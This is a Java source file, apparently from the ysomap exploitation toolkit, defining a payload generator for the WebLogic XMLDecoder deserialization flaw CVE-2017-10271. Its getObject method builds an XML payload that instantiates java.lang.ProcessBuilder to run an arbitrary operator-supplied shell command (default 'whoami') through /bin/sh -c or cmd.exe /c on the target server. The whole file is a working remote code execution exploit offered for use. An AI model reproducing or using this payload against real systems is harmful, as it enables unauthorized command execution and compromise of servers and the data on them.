package ysomap.bullets.weblogic.xml;

import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;

/**
 * for CVE-2017-10271
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("使用Weblogic的XML反序列化漏洞，当前为适用于CVE-2017-10271或其他未受限制的XMLDecoder反序列化漏洞。\n" +
        "执行后，可执行任意代码")
@Targets({Targets.XMLDECODER})
@Dependencies({"*"})
public class WeblogicXMLRCEBullet extends AbstractBullet<String> {

    @NotNull
    @Require(name = "cmd", detail = "需要执行的系统命令")
    public String cmd = "whoami";

    @NotNull
    @Require(name = "os", detail = "系统类型，如WIN or LINUX")
    public String os = "LINUX";

    @Override
    public String getObject() throws Exception {

        String operator = "LINUX".equals(os)?"/bin/sh":"cmd.exe";
        String args = "LINUX".equals(os)?"-c":"/c";

        return "\t <java> \n" +
                "\t\t<void class=\"java.lang.ProcessBuilder\"> \n" +
                "\t\t  <array class=\"java.lang.String\" length=\"3\"> \n" +
                "\t\t\t<void index=\"0\"> \n" +
                "\t\t\t  <string>"+operator+"</string> \n" +
                "\t\t\t</void>  \n" +
                "\t\t\t<void index=\"1\"> \n" +
                "\t\t\t  <string>"+args+"</string> \n" +
                "\t\t\t</void>  \n" +
                "\t\t\t<void index=\"2\"> \n" +
                "\t\t\t  <string>"+cmd+"</string>\n" +
                "\t\t\t</void>\n" +
                "\t\t  </array>\n" +
                "\t\t  <void method=\"start\"/> \n" +
                "\t\t</void>\n" +
                "\t  </java>";
    }
}
